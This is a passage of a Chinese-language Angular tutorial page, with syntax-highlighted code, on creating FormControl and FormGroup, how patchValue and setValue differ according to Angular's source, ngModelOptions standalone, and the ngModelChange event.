</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h3 id="创建formcontrol-formgroup"><a href="#创建formcontrol-formgroup" class="header-anchor">#</a> 创建FormControl/FormGroup</h3> <blockquote><p>FormControl</p></blockquote> <ul><li>方式一</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> ctrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">'some value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'some value'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>方式二</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">const</span> ctrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token punctuation">{</span> value<span class="token operator">:</span> <span class="token string">'n/a'</span><span class="token punctuation">,</span> disabled<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'n/a'</span>
<span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// DISABLED</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>若没有设置 disabled 属性，即：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> ctrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token punctuation">{</span> value<span class="token operator">:</span> <span class="token string">'n/a'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Object {value: &quot;n/a&quot;}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// VALID</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>方式三</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> ctrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span>required<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ''</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ctrl<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//INVALID</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><blockquote><p>FormGroup</p></blockquote> <ul><li>方式一</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormGroup</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  first<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">'Nancy'</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">minLength</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  last<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">'Drew'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Object {first: &quot;Nancy&quot;, last: &quot;Drew&quot;}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 'VALID'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>方式二</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">const</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormGroup</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  password<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">minLength</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  passwordConfirm<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">minLength</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> passwordMatchValidator<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">passwordMatchValidator</span><span class="token punctuation">(</span><span class="token parameter">g<span class="token operator">:</span> FormGroup</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> g<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">===</span> g<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'passwordConfirm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value
     <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token string">'mismatch'</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="patchvalue-setvalue"><a href="#patchvalue-setvalue" class="header-anchor">#</a> patchValue/setValue</h3> <blockquote><p>FormControl</p></blockquote> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token function">patchValue</span><span class="token punctuation">(</span>value<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> options<span class="token operator">:</span> <span class="token punctuation">{</span>
    onlySelf<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">,</span>
    emitEvent<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">,</span>
    emitModelToViewChange<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">,</span>
    emitViewToModelChange<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span>
  <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>onlySelf<span class="token punctuation">,</span> emitEvent<span class="token punctuation">,</span> emitModelToViewChange<span class="token punctuation">,</span> emitViewToModelChange<span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    onlySelf<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">,</span>
    emitEvent<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">,</span>
    emitModelToViewChange<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">,</span>
    emitViewToModelChange<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span>
  <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_onChange<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> emitModelToViewChange <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_onChange<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">changeFn</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">changeFn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">,</span>
          emitViewToModelChange <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">{</span>onlySelf<span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>方法的第一个参数，就是我们要设置的值，第二个参数是一个对象：</p> <ul><li>onlySelf：若该值为 true，当控件的值发生变化后，只会影响当前控件的验证状态，而不会影响到它的父组件。默认值是 false。</li> <li>emitEvent：若该值为 true，当控件的值发生变化后，将会触发 valueChanges 事件。默认值是 true</li> <li>emitModelToViewChange：若该值为 true，当控件的值发生变化时，将会把新值通过 onChange 事件通知视图层。若未指定 emitModelToViewChange 的值，这是默认的行为。</li> <li>emitViewToModelChange：若该值为 true，ngModelChange 事件将会被触发，用于更新模型。若未指定 emitViewToModelChange 的值，这是默认的行为。</li></ul> <div class="custom-block tip"><p class="custom-block-title">patchValue() 方法有什么好处呢？</p> <p>假设我们使用 firebase，那么当我们从 API 接口获取数据对象时，对象内部可能会包含 $exists 和 $key 属性。而当我们直接使用返回的数据对象作为参数，直接调用 patchValue() 方法时，不会抛出任何异常：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>this.form.patchValue({
  $exists: function () {},
  $key: '-KWihhw-f1kw-ULPG1ei',
  name: 'Semlinker',
  event: {
    title: 'Angular 4.x\'s Road',
    location: 'Xiamen'
  }
});
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div></div> <p>通过源码我们发现对于 FormControl 对象来说，patchValue() 和 setValue() 这两个方法是等价的。此外 setValue() 方法中做了三件事：</p> <ul><li>更新控件当前值</li> <li>判断是否注册 onChange 事件，若有则循环调用已注册的 changeFn 函数。</li> <li>重新计算控件的值和验证状态</li></ul> <blockquote><p>FormGroup</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">patchValue</span><span class="token punctuation">(</span>
  value<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>onlySelf<span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span>onlySelf<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">,</span> emitEvent<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">name</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>controls<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>controls<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">patchValue</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>onlySelf<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">{</span>onlySelf<span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
进入 Object.keys() 循环时候先使用 this.controls[name] 进行过滤，只更新参数 value 中设定控件的值
*/</span>
<span class="token function">setValue</span><span class="token punctuation">(</span>
  value<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">,</span>
   <span class="token punctuation">{</span>onlySelf<span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span>onlySelf<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">,</span> emitEvent<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_checkAllValuesPresent</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 判断的是否为所有控件都设置更新值</span>
    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">name</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_throwIfControlMissing</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 判断控件是否存在</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>controls<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>onlySelf<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">{</span>onlySelf<span class="token punctuation">,</span> emitEvent<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 重新计算控件的值和验证状态</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
setValue先调用 _checkAllValuesPresent() 方法，对输入值进行校验。该方法内部通过 _forEachChild() 遍历内部的 FormControl 控件，来确保我们在调用 setValue() 方法时，设置的参数对象中，会包含所有控件的配置信息。如果 name 对应的配置信息不存在，则会抛出异常。
然后调用 _throwIfControlMissing() 判断控件是否存在，验证通过后，Angular 会进入 Object.keys() 循环调用 setValue() 方法
*/</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>_checkAllValuesPresent方法的具体实现如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">_checkAllValuesPresent</span><span class="token punctuation">(</span>value<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_forEachChild</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">control<span class="token operator">:</span> AbstractControl<span class="token punctuation">,</span> name<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Must supply a value for form control with name: '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>_throwIfControlMissing() 方法的具体实现如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">_throwIfControlMissing</span><span class="token punctuation">(</span>name<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>controls<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
        There are no form controls registered with this group yet.  
        If you're using ngModel,
        you may want to check next tick (e.g. use setTimeout).
      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>controls<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Cannot find form control with name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>上面代码首先判断 this.controls 是否存在，如果存在进一步判断 name 对应的 FormControl 控件是否存在。当 _throwIfControlMissing() 验证通过后，才会最终调用 FormControl 控件的 setValue() 方法。</p> <p>通过查看源码，我们发现 setValue() 方法相比 patchValue() 会更严格，会执行多个判断：</p> <ul><li>判断的是否为所有控件都设置更新值</li> <li>判断控件是否存在</li></ul> <p>而 patchValue() 方法，会先使用 this.controls[name] 进行过滤，只更新参数 value 中设定控件的值。</p> <h3 id="ngmodeloptions"><a href="#ngmodeloptions" class="header-anchor">#</a> ngModelOptions</h3> <p>当你在使用 ngModel 时未设置 name 属性，如下所示：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>form novalidate #f<span class="token operator">=</span><span class="token string">&quot;ngForm&quot;</span><span class="token operator">&gt;</span>
   Name<span class="token operator">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>ngModel<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;user.username&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>当你运行时，浏览器控制台将会抛出以下异常信息：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Error<span class="token operator">:</span> If ngModel is used within a form tag<span class="token punctuation">,</span> either the name attribute must be <span class="token keyword">set</span> or the form control must be defined <span class="token keyword">as</span> <span class="token string">'standalone'</span> <span class="token keyword">in</span> ngModelOptions<span class="token punctuation">.</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>以上异常信息告诉我们，如果在表单标签中使用 ngModel，则必须设置 name 属性，或者在 ngModelOptions 中必须将表单控件定义为 &quot;standalone&quot;。依据上述异常信息，我们做如下调整：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>form novalidate #f<span class="token operator">=</span><span class="token string">&quot;ngForm&quot;</span><span class="token operator">&gt;</span>
   Name<span class="token operator">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>ngModel<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;user.username&quot;</span> 
              <span class="token punctuation">[</span>ngModelOptions<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;{standalone: true}&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>接下来我们看一下 ngModelOptions 支持的对象类型：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'ngModelOptions'</span><span class="token punctuation">)</span> options<span class="token operator">:</span> <span class="token punctuation">{</span>name<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">,</span> standalone<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="ngmodelchange"><a href="#ngmodelchange" class="header-anchor">#</a> ngModelChange</h3> <p>双向绑定都可以监听数据的改变</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;form novalidate #f=&quot;ngForm&quot;&gt;
      Name: &lt;input type=&quot;text&quot; name=&quot;username&quot; (ngModelChange)=&quot;userNameChange($event)&quot;
        [(ngModel)]=&quot;user.username&quot;&gt;
   &lt;/form&gt;
   {{ user | json }}
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  user<span class="token operator">:</span> <span class="token punctuation">{</span> username<span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token punctuation">{</span> username<span class="token operator">:</span> <span class="token string">'Semlinker'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">userNameChange</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token operator">:</span> <span class="token builtin">string</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
